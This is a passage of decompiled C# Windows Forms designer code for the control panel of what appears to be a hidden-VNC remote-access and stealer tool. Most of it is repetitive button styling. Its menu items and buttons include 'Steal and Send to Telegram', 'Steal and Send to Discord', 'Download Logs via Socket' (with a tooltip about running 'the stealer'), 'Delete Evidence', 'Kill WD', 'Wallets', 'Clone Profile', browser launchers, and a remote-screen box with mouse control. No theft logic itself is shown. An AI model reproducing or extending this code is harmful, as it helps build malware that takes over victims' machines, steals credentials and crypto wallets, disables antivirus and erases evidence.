			this.btnEpic.Name = "btnEpic";
			this.btnEpic.Size = new System.Drawing.Size(138, 22);
			this.btnEpic.Text = "Epic";
			this.btnEpic.Click += new System.EventHandler(btnOpera_Click);
			this.btnVivaldi.Name = "btnVivaldi";
			this.btnVivaldi.Size = new System.Drawing.Size(138, 22);
			this.btnVivaldi.Text = "Vivaldi";
			this.btnVivaldi.Click += new System.EventHandler(btnVivaldi_Click);
			this.btn360.Name = "btn360";
			this.btn360.Size = new System.Drawing.Size(138, 22);
			this.btn360.Text = "360";
			this.btn360.Click += new System.EventHandler(btn360_Click);
			this.btnSputnik.Name = "btnSputnik";
			this.btnSputnik.Size = new System.Drawing.Size(138, 22);
			this.btnSputnik.Text = "Sputnik";
			this.btnSputnik.Click += new System.EventHandler(btnSputnik_Click);
			this.comodoToolStripMenuItem.Name = "comodoToolStripMenuItem";
			this.comodoToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
			this.comodoToolStripMenuItem.Text = "Comodo";
			this.comodoToolStripMenuItem.Click += new System.EventHandler(comodoToolStripMenuItem_Click);
			this.yandexToolStripMenuItem.Name = "yandexToolStripMenuItem";
			this.yandexToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
			this.yandexToolStripMenuItem.Text = "Yandex";
			this.yandexToolStripMenuItem.Visible = false;
			this.yandexToolStripMenuItem.Click += new System.EventHandler(yandexToolStripMenuItem_Click);
			this.operaNeonToolStripMenuItem.Name = "operaNeonToolStripMenuItem";
			this.operaNeonToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
			this.operaNeonToolStripMenuItem.Text = "Opera Neon";
			this.operaNeonToolStripMenuItem.Click += new System.EventHandler(operaNeonToolStripMenuItem_Click);
			this.waterFoxToolStripMenuItem.Name = "waterFoxToolStripMenuItem";
			this.waterFoxToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
			this.waterFoxToolStripMenuItem.Text = "WaterFox";
			this.waterFoxToolStripMenuItem.Click += new System.EventHandler(waterFoxToolStripMenuItem_Click);
			this.orbitumToolStripMenuItem.Name = "orbitumToolStripMenuItem";
			this.orbitumToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
			this.orbitumToolStripMenuItem.Text = "Orbitum";
			this.orbitumToolStripMenuItem.Click += new System.EventHandler(orbitumToolStripMenuItem_Click);
			this.atomToolStripMenuItem.Name = "atomToolStripMenuItem";
			this.atomToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
			this.atomToolStripMenuItem.Text = "Atom";
			this.atomToolStripMenuItem.Click += new System.EventHandler(atomToolStripMenuItem_Click);
			this.slimjetToolStripMenuItem.Name = "slimjetToolStripMenuItem";
			this.slimjetToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
			this.slimjetToolStripMenuItem.Text = "Slimjet";
			this.slimjetToolStripMenuItem.Click += new System.EventHandler(slimjetToolStripMenuItem_Click);
			this.contextMenuStrip5.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.msinfo32exeToolStripMenuItem, this.mstscexeToolStripMenuItem, this.notepadToolStripMenuItem, this.controlPanelToolStripMenuItem });
			this.contextMenuStrip5.Name = "contextMenuStrip1";
			this.contextMenuStrip5.Size = new System.Drawing.Size(147, 92);
			this.msinfo32exeToolStripMenuItem.Name = "msinfo32exeToolStripMenuItem";
			this.msinfo32exeToolStripMenuItem.Size = new System.Drawing.Size(146, 22);
			this.msinfo32exeToolStripMenuItem.Text = "msinfo32.exe";
			this.msinfo32exeToolStripMenuItem.Click += new System.EventHandler(msinfo32exeToolStripMenuItem_Click);
			this.mstscexeToolStripMenuItem.Name = "mstscexeToolStripMenuItem";
			this.mstscexeToolStripMenuItem.Size = new System.Drawing.Size(146, 22);
			this.mstscexeToolStripMenuItem.Text = "mstsc.exe";
			this.mstscexeToolStripMenuItem.Click += new System.EventHandler(mstscexeToolStripMenuItem_Click);
			this.notepadToolStripMenuItem.Name = "notepadToolStripMenuItem";
			this.notepadToolStripMenuItem.Size = new System.Drawing.Size(146, 22);
			this.notepadToolStripMenuItem.Text = "Notepad";
			this.notepadToolStripMenuItem.Click += new System.EventHandler(notepadToolStripMenuItem_Click);
			this.controlPanelToolStripMenuItem.Name = "controlPanelToolStripMenuItem";
			this.controlPanelToolStripMenuItem.Size = new System.Drawing.Size(146, 22);
			this.controlPanelToolStripMenuItem.Text = "Control Panel";
			this.controlPanelToolStripMenuItem.Click += new System.EventHandler(controlPanelToolStripMenuItem_Click);
			this.timer3.Enabled = true;
			this.timer3.Interval = 1000;
			this.timer3.Tick += new System.EventHandler(timer3_Tick);
			this.contextMenuStrip6.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.stealAndSendToTelegramToolStripMenuItem, this.stealAndSendToDiscordToolStripMenuItem, this.downloadLogsViaSocketToolStripMenuItem, this.clearEvidenceToolStripMenuItem });
			this.contextMenuStrip6.Name = "contextMenuStrip1";
			this.contextMenuStrip6.Size = new System.Drawing.Size(217, 92);
			this.stealAndSendToTelegramToolStripMenuItem.Name = "stealAndSendToTelegramToolStripMenuItem";
			this.stealAndSendToTelegramToolStripMenuItem.Size = new System.Drawing.Size(216, 22);
			this.stealAndSendToTelegramToolStripMenuItem.Text = "Steal and Send to Telegram";
			this.stealAndSendToTelegramToolStripMenuItem.Click += new System.EventHandler(stealAndSendToTelegramToolStripMenuItem_Click);
			this.stealAndSendToDiscordToolStripMenuItem.Name = "stealAndSendToDiscordToolStripMenuItem";
			this.stealAndSendToDiscordToolStripMenuItem.Size = new System.Drawing.Size(216, 22);
			this.stealAndSendToDiscordToolStripMenuItem.Text = "Steal and Send to Discord";
			this.stealAndSendToDiscordToolStripMenuItem.Click += new System.EventHandler(stealAndSendToDiscordToolStripMenuItem_Click);
			this.downloadLogsViaSocketToolStripMenuItem.Name = "downloadLogsViaSocketToolStripMenuItem";
			this.downloadLogsViaSocketToolStripMenuItem.Size = new System.Drawing.Size(216, 22);
			this.downloadLogsViaSocketToolStripMenuItem.Text = "Download Logs via Socket";
			this.downloadLogsViaSocketToolStripMenuItem.ToolTipText = "Before you use this option make sure you run the stealer with option socket!";
			this.downloadLogsViaSocketToolStripMenuItem.Click += new System.EventHandler(downloadLogsViaSocketToolStripMenuItem_Click);
			this.clearEvidenceToolStripMenuItem.Name = "clearEvidenceToolStripMenuItem";
			this.clearEvidenceToolStripMenuItem.Size = new System.Drawing.Size(216, 22);
			this.clearEvidenceToolStripMenuItem.Text = "Delete Evidence";
			this.clearEvidenceToolStripMenuItem.Click += new System.EventHandler(clearEvidenceToolStripMenuItem_Click);
			this.primeTheme1.BackColor = System.Drawing.Color.White;
			this.primeTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
			bloom.Name = "Sides";
			bloom.Value = System.Drawing.Color.FromArgb(232, 232, 232);
			bloom2.Name = "Gradient1";
			bloom2.Value = System.Drawing.Color.FromArgb(252, 252, 252);
			bloom3.Name = "Gradient2";
			bloom3.Value = System.Drawing.Color.FromArgb(242, 242, 242);
			bloom4.Name = "TextShade";
			bloom4.Value = System.Drawing.Color.White;
			bloom5.Name = "Text";
			bloom5.Value = System.Drawing.Color.FromArgb(80, 80, 80);
			bloom6.Name = "Back";
			bloom6.Value = System.Drawing.Color.White;
			bloom7.Name = "Border1";
			bloom7.Value = System.Drawing.Color.FromArgb(180, 180, 180);
			bloom8.Name = "Border2";
			bloom8.Value = System.Drawing.Color.White;
			bloom9.Name = "Border3";
			bloom9.Value = System.Drawing.Color.White;
			bloom10.Name = "Border4";
			bloom10.Value = System.Drawing.Color.FromArgb(150, 150, 150);
			this.primeTheme1.Colors = new BloomBrain[10] { bloom, bloom2, bloom3, bloom4, bloom5, bloom6, bloom7, bloom8, bloom9, bloom10 };
			this.primeTheme1.Controls.Add(this.studioButton11);
			this.primeTheme1.Controls.Add(this.studioButton10);
			this.primeTheme1.Controls.Add(this.studioButton8);
			this.primeTheme1.Controls.Add(this.studioButton6);
			this.primeTheme1.Controls.Add(this.VNCBox);
			this.primeTheme1.Controls.Add(this.studioButton2);
			this.primeTheme1.Controls.Add(this.btnElectrum);
			this.primeTheme1.Controls.Add(this.btnRootkit);
			this.primeTheme1.Controls.Add(this.btnWatcher);
			this.primeTheme1.Controls.Add(this.label1);
			this.primeTheme1.Controls.Add(this.chkClone);
			this.primeTheme1.Controls.Add(this.studioButton1);
			this.primeTheme1.Controls.Add(this.btnPaste);
			this.primeTheme1.Controls.Add(this.btnCopy);
			this.primeTheme1.Controls.Add(this.btnEx);
			this.primeTheme1.Controls.Add(this.btnCMD);
			this.primeTheme1.Controls.Add(this.btnPowershell);
			this.primeTheme1.Controls.Add(this.button3);
			this.primeTheme1.Controls.Add(this.ShowStart);
			this.primeTheme1.Controls.Add(this.MinBtn);
			this.primeTheme1.Controls.Add(this.RestoreMaxBtn);
			this.primeTheme1.Controls.Add(this.CloseBtn);
			this.primeTheme1.Controls.Add(this.pictureBox1);
			this.primeTheme1.Controls.Add(this.studioButton5);
			this.primeTheme1.Controls.Add(this.studioButton4);
			this.primeTheme1.Controls.Add(this.studioButton3);
			this.primeTheme1.Controls.Add(this.statusStrip1);
			this.primeTheme1.Controls.Add(this.groupBox6);
			this.primeTheme1.Controls.Add(this.label3);
			this.primeTheme1.Controls.Add(this.studioButton9);
			this.primeTheme1.Controls.Add(this.studioButton7);
			this.primeTheme1.Controls.Add(this.label2);
			this.primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
			this.primeTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
			this.primeTheme1.Font = new System.Drawing.Font("Verdana", 8f);
			this.primeTheme1.Image = null;
			this.primeTheme1.Location = new System.Drawing.Point(0, 0);
			this.primeTheme1.Movable = true;
			this.primeTheme1.Name = "primeTheme1";
			this.primeTheme1.NoRounding = false;
			this.primeTheme1.Sizable = true;
			this.primeTheme1.Size = new System.Drawing.Size(1223, 678);
			this.primeTheme1.SmartBounds = true;
			this.primeTheme1.TabIndex = 32;
			this.primeTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
			this.studioButton11.BackColor = System.Drawing.Color.Transparent;
			bloom11.Name = "DownGradient1";
			bloom11.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom12.Name = "DownGradient2";
			bloom12.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom13.Name = "NoneGradient1";
			bloom13.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom14.Name = "NoneGradient2";
			bloom14.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom15.Name = "Shine1";
			bloom15.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom16.Name = "Shine2A";
			bloom16.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom17.Name = "Shine2B";
			bloom17.Value = System.Drawing.Color.Transparent;
			bloom18.Name = "Shine3";
			bloom18.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom19.Name = "TextShade";
			bloom19.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom20.Name = "Text";
			bloom20.Value = System.Drawing.Color.White;
			bloom21.Name = "Glow";
			bloom21.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom22.Name = "Border";
			bloom22.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom23.Name = "Corners";
			bloom23.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton11.Colors = new BloomBrain[13]
			{
				bloom11, bloom12, bloom13, bloom14, bloom15, bloom16, bloom17, bloom18, bloom19, bloom20,
				bloom21, bloom22, bloom23
			};
			this.studioButton11.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton11.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton11.Image = null;
			this.studioButton11.Location = new System.Drawing.Point(27, 83);
			this.studioButton11.Name = "studioButton11";
			this.studioButton11.NoRounding = false;
			this.studioButton11.Size = new System.Drawing.Size(94, 25);
			this.studioButton11.TabIndex = 83;
			this.studioButton11.Text = "Rescale";
			this.studioButton11.Transparent = true;
			this.studioButton11.Click += new System.EventHandler(studioButton11_Click);
			this.studioButton10.BackColor = System.Drawing.Color.Transparent;
			bloom24.Name = "DownGradient1";
			bloom24.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom25.Name = "DownGradient2";
			bloom25.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom26.Name = "NoneGradient1";
			bloom26.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom27.Name = "NoneGradient2";
			bloom27.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom28.Name = "Shine1";
			bloom28.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom29.Name = "Shine2A";
			bloom29.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom30.Name = "Shine2B";
			bloom30.Value = System.Drawing.Color.Transparent;
			bloom31.Name = "Shine3";
			bloom31.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom32.Name = "TextShade";
			bloom32.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom33.Name = "Text";
			bloom33.Value = System.Drawing.Color.White;
			bloom34.Name = "Glow";
			bloom34.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom35.Name = "Border";
			bloom35.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom36.Name = "Corners";
			bloom36.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton10.Colors = new BloomBrain[13]
			{
				bloom24, bloom25, bloom26, bloom27, bloom28, bloom29, bloom30, bloom31, bloom32, bloom33,
				bloom34, bloom35, bloom36
			};
			this.studioButton10.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton10.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton10.Image = null;
			this.studioButton10.Location = new System.Drawing.Point(27, 145);
			this.studioButton10.Name = "studioButton10";
			this.studioButton10.NoRounding = false;
			this.studioButton10.Size = new System.Drawing.Size(94, 25);
			this.studioButton10.TabIndex = 82;
			this.studioButton10.Text = "Recovery";
			this.studioButton10.Transparent = true;
			this.studioButton10.Click += new System.EventHandler(studioButton10_Click);
			this.studioButton8.BackColor = System.Drawing.Color.Transparent;
			bloom37.Name = "DownGradient1";
			bloom37.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom38.Name = "DownGradient2";
			bloom38.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom39.Name = "NoneGradient1";
			bloom39.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom40.Name = "NoneGradient2";
			bloom40.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom41.Name = "Shine1";
			bloom41.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom42.Name = "Shine2A";
			bloom42.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom43.Name = "Shine2B";
			bloom43.Value = System.Drawing.Color.Transparent;
			bloom44.Name = "Shine3";
			bloom44.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom45.Name = "TextShade";
			bloom45.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom46.Name = "Text";
			bloom46.Value = System.Drawing.Color.White;
			bloom47.Name = "Glow";
			bloom47.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom48.Name = "Border";
			bloom48.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom49.Name = "Corners";
			bloom49.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton8.Colors = new BloomBrain[13]
			{
				bloom37, bloom38, bloom39, bloom40, bloom41, bloom42, bloom43, bloom44, bloom45, bloom46,
				bloom47, bloom48, bloom49
			};
			this.studioButton8.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton8.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton8.Image = null;
			this.studioButton8.Location = new System.Drawing.Point(27, 114);
			this.studioButton8.Name = "studioButton8";
			this.studioButton8.NoRounding = false;
			this.studioButton8.Size = new System.Drawing.Size(94, 25);
			this.studioButton8.TabIndex = 81;
			this.studioButton8.Text = "Help";
			this.studioButton8.Transparent = true;
			this.studioButton8.Click += new System.EventHandler(studioButton8_Click_1);
			this.studioButton6.BackColor = System.Drawing.Color.Transparent;
			bloom50.Name = "DownGradient1";
			bloom50.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom51.Name = "DownGradient2";
			bloom51.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom52.Name = "NoneGradient1";
			bloom52.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom53.Name = "NoneGradient2";
			bloom53.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom54.Name = "Shine1";
			bloom54.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom55.Name = "Shine2A";
			bloom55.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom56.Name = "Shine2B";
			bloom56.Value = System.Drawing.Color.Transparent;
			bloom57.Name = "Shine3";
			bloom57.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom58.Name = "TextShade";
			bloom58.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom59.Name = "Text";
			bloom59.Value = System.Drawing.Color.White;
			bloom60.Name = "Glow";
			bloom60.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom61.Name = "Border";
			bloom61.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom62.Name = "Corners";
			bloom62.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton6.Colors = new BloomBrain[13]
			{
				bloom50, bloom51, bloom52, bloom53, bloom54, bloom55, bloom56, bloom57, bloom58, bloom59,
				bloom60, bloom61, bloom62
			};
			this.studioButton6.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton6.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton6.Image = null;
			this.studioButton6.Location = new System.Drawing.Point(27, 517);
			this.studioButton6.Name = "studioButton6";
			this.studioButton6.NoRounding = false;
			this.studioButton6.Size = new System.Drawing.Size(94, 25);
			this.studioButton6.TabIndex = 74;
			this.studioButton6.Text = "Wallets";
			this.studioButton6.Transparent = true;
			this.studioButton6.Visible = false;
			this.studioButton6.Click += new System.EventHandler(studioButton6_Click);
			this.VNCBox.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.VNCBox.BackgroundImage = (System.Drawing.Image)resources.GetObject("VNCBox.BackgroundImage");
			this.VNCBox.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
			this.VNCBox.Location = new System.Drawing.Point(134, 32);
			this.VNCBox.Name = "VNCBox";
			this.VNCBox.Size = new System.Drawing.Size(1075, 633);
			this.VNCBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.VNCBox.TabIndex = 7;
			this.VNCBox.TabStop = false;
			this.VNCBox.MouseDown += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseDown);
			this.VNCBox.MouseEnter += new System.EventHandler(VNCBox_MouseEnter_1);
			this.VNCBox.MouseHover += new System.EventHandler(VNCBox_MouseHover);
			this.VNCBox.MouseMove += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseMove);
			this.VNCBox.MouseUp += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseUp);
			this.studioButton2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.studioButton2.BackColor = System.Drawing.Color.Transparent;
			bloom63.Name = "DownGradient1";
			bloom63.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom64.Name = "DownGradient2";
			bloom64.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom65.Name = "NoneGradient1";
			bloom65.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom66.Name = "NoneGradient2";
			bloom66.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom67.Name = "Shine1";
			bloom67.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom68.Name = "Shine2A";
			bloom68.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom69.Name = "Shine2B";
			bloom69.Value = System.Drawing.Color.Transparent;
			bloom70.Name = "Shine3";
			bloom70.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom71.Name = "TextShade";
			bloom71.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom72.Name = "Text";
			bloom72.Value = System.Drawing.Color.White;
			bloom73.Name = "Glow";
			bloom73.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom74.Name = "Border";
			bloom74.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom75.Name = "Corners";
			bloom75.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton2.Colors = new BloomBrain[13]
			{
				bloom63, bloom64, bloom65, bloom66, bloom67, bloom68, bloom69, bloom70, bloom71, bloom72,
				bloom73, bloom74, bloom75
			};
			this.studioButton2.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton2.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton2.Image = null;
			this.studioButton2.Location = new System.Drawing.Point(1139, -5);
			this.studioButton2.Name = "studioButton2";
			this.studioButton2.NoRounding = false;
			this.studioButton2.Size = new System.Drawing.Size(13, 30);
			this.studioButton2.TabIndex = 73;
			this.studioButton2.Transparent = true;
			this.studioButton2.Click += new System.EventHandler(studioButton2_Click_1);
			this.btnElectrum.BackColor = System.Drawing.Color.Transparent;
			bloom76.Name = "DownGradient1";
			bloom76.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom77.Name = "DownGradient2";
			bloom77.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom78.Name = "NoneGradient1";
			bloom78.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom79.Name = "NoneGradient2";
			bloom79.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom80.Name = "Shine1";
			bloom80.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom81.Name = "Shine2A";
			bloom81.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom82.Name = "Shine2B";
			bloom82.Value = System.Drawing.Color.Transparent;
			bloom83.Name = "Shine3";
			bloom83.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom84.Name = "TextShade";
			bloom84.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom85.Name = "Text";
			bloom85.Value = System.Drawing.Color.White;
			bloom86.Name = "Glow";
			bloom86.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom87.Name = "Border";
			bloom87.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom88.Name = "Corners";
			bloom88.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.btnElectrum.Colors = new BloomBrain[13]
			{
				bloom76, bloom77, bloom78, bloom79, bloom80, bloom81, bloom82, bloom83, bloom84, bloom85,
				bloom86, bloom87, bloom88
			};
			this.btnElectrum.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.btnElectrum.Font = new System.Drawing.Font("Verdana", 8f);
			this.btnElectrum.Image = null;
			this.btnElectrum.Location = new System.Drawing.Point(27, 393);
			this.btnElectrum.Name = "btnElectrum";
			this.btnElectrum.NoRounding = false;
			this.btnElectrum.Size = new System.Drawing.Size(94, 25);
			this.btnElectrum.TabIndex = 72;
			this.btnElectrum.Text = "Kill WD";
			this.btnElectrum.Transparent = true;
			this.btnElectrum.Click += new System.EventHandler(studioButton2_Click);
			this.btnRootkit.BackColor = System.Drawing.Color.Transparent;
			bloom89.Name = "DownGradient1";
			bloom89.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom90.Name = "DownGradient2";
			bloom90.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom91.Name = "NoneGradient1";
			bloom91.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom92.Name = "NoneGradient2";
			bloom92.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom93.Name = "Shine1";
			bloom93.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom94.Name = "Shine2A";
			bloom94.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom95.Name = "Shine2B";
			bloom95.Value = System.Drawing.Color.Transparent;
			bloom96.Name = "Shine3";
			bloom96.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom97.Name = "TextShade";
			bloom97.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom98.Name = "Text";
			bloom98.Value = System.Drawing.Color.White;
			bloom99.Name = "Glow";
			bloom99.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom100.Name = "Border";
			bloom100.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom101.Name = "Corners";
			bloom101.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.btnRootkit.Colors = new BloomBrain[13]
			{
				bloom89, bloom90, bloom91, bloom92, bloom93, bloom94, bloom95, bloom96, bloom97, bloom98,
				bloom99, bloom100, bloom101
			};
			this.btnRootkit.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.btnRootkit.Font = new System.Drawing.Font("Verdana", 8f);
			this.btnRootkit.Image = null;
			this.btnRootkit.Location = new System.Drawing.Point(27, 424);
			this.btnRootkit.Name = "btnRootkit";
			this.btnRootkit.NoRounding = false;
			this.btnRootkit.Size = new System.Drawing.Size(94, 25);
			this.btnRootkit.TabIndex = 71;
			this.btnRootkit.Text = "Apps";
			this.btnRootkit.Transparent = true;
			this.btnRootkit.Click += new System.EventHandler(btnRootkit_Click);
			this.btnWatcher.BackColor = System.Drawing.Color.Transparent;
			bloom102.Name = "DownGradient1";
			bloom102.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom103.Name = "DownGradient2";
			bloom103.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom104.Name = "NoneGradient1";
			bloom104.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom105.Name = "NoneGradient2";
			bloom105.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom106.Name = "Shine1";
			bloom106.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom107.Name = "Shine2A";
			bloom107.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom108.Name = "Shine2B";
			bloom108.Value = System.Drawing.Color.Transparent;
			bloom109.Name = "Shine3";
			bloom109.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom110.Name = "TextShade";
			bloom110.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom111.Name = "Text";
			bloom111.Value = System.Drawing.Color.White;
			bloom112.Name = "Glow";
			bloom112.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom113.Name = "Border";
			bloom113.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom114.Name = "Corners";
			bloom114.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.btnWatcher.Colors = new BloomBrain[13]
			{
				bloom102, bloom103, bloom104, bloom105, bloom106, bloom107, bloom108, bloom109, bloom110, bloom111,
				bloom112, bloom113, bloom114
			};
			this.btnWatcher.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.btnWatcher.Font = new System.Drawing.Font("Verdana", 8f);
			this.btnWatcher.Image = null;
			this.btnWatcher.Location = new System.Drawing.Point(27, 362);
			this.btnWatcher.Name = "btnWatcher";
			this.btnWatcher.NoRounding = false;
			this.btnWatcher.Size = new System.Drawing.Size(94, 25);
			this.btnWatcher.TabIndex = 70;
			this.btnWatcher.Text = "Watcher";
			this.btnWatcher.Transparent = true;
			this.btnWatcher.Click += new System.EventHandler(btnWatcher_Click);
			this.label1.AutoSize = true;
			this.label1.BackColor = System.Drawing.Color.Transparent;
			this.label1.Location = new System.Drawing.Point(34, 608);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(80, 13);
			this.label1.TabIndex = 66;
			this.label1.Text = "Clone Profile";
			this.chkClone.BackColor = System.Drawing.Color.Transparent;
			this.chkClone.Location = new System.Drawing.Point(49, 624);
			this.chkClone.Name = "chkClone";
			this.chkClone.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.chkClone.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.chkClone.Size = new System.Drawing.Size(50, 19);
			this.chkClone.Style = JCS.ToggleSwitch.ToggleSwitchStyle.BrushedMetal;
			this.chkClone.TabIndex = 65;
			this.studioButton1.BackColor = System.Drawing.Color.Transparent;
			this.studioButton1.BackColor = System.Drawing.Color.Transparent;
			bloom115.Name = "DownGradient1";
			bloom115.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom116.Name = "DownGradient2";
